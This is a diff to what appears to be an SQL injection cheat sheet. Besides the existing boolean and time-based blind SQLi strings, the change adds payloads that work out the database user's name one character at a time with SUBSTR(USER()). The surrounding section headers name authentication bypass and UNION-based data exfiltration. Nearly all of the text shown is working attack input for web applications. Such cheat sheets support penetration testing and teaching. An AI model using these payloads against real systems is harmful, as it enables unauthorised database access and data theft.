@@ -236,6 +236,7 @@ Authentication Bypass:
 
 Blind SQLi (Boolean / Time-based)
 ```sql
+/* General */
 %' AND 1=1 AND '%'='                  -- BOOLEAN: TRUE
 %' AND 1=0 AND '%'='                  -- BOOLEAN: FALSE
 company=sap%' AND SLEEP(5) AND '%'='  -- TIME-BASED   
@@ -243,6 +244,10 @@ page.asp?id=1 or 1=1 -- true
 page.asp?id=1' or 1=1 -- true
 page.asp?id=1" or 1=1 -- true
 page.asp?id=1 and 1=2 -- false
+
+/* Enumerate username string */
+page.asp?id=1 and SUBSTR(USER(), 1, 1) = 'a'
+page.asp?id=1 and SUBSTR(USER(), 1, 1) = 'd'  -- repeat 'a','d','m','i','n'
 ```
 
 UNION SELECT (exfiltrating data):
